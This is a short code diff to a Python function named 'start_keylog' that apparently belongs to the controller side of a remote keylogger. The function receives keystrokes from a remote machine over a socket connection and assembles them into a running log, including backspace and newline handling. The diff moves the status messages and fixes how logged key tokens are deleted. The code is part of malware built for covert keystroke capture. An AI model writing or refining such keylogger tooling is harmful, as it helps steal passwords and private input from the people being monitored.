@@ -188,7 +188,10 @@ def start_keylog(cmd,conn):
     try:
         log = ''
         print()
+        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
         while True:
+            print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
+            print(f"{log}",end="\r")
             out = conn.recv(BUFFER_SIZE).decode()
             os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
             if out == "BACKSPACE": #If the user hit backspace, delete one keystroke from the string
@@ -197,9 +200,8 @@ def start_keylog(cmd,conn):
                         i = len(log)-1 #Set i = length of the log - 1
                         while(log[i]) != "(": #Iterate backwards until we find a (
                             i-=1
-                        print(log[i:i+4])
-                        if log[i:i+4] == "(Key": #If the string is '(Key' then we found a key to delete
-                            log = log[:i]
+                        if log[i:i+4] == "(Key": #If the string is '(Key' then we found a key to delete. 
+                            log = log[:i-1] #Delete the keystroke and one char before it
                         else:
                             log = log[:-1]
                     else:
@@ -210,8 +212,6 @@ def start_keylog(cmd,conn):
                 log += "\n"
             else:
                 log += out
-            print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
-            print(f"{log}",end="\r")
 
     except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
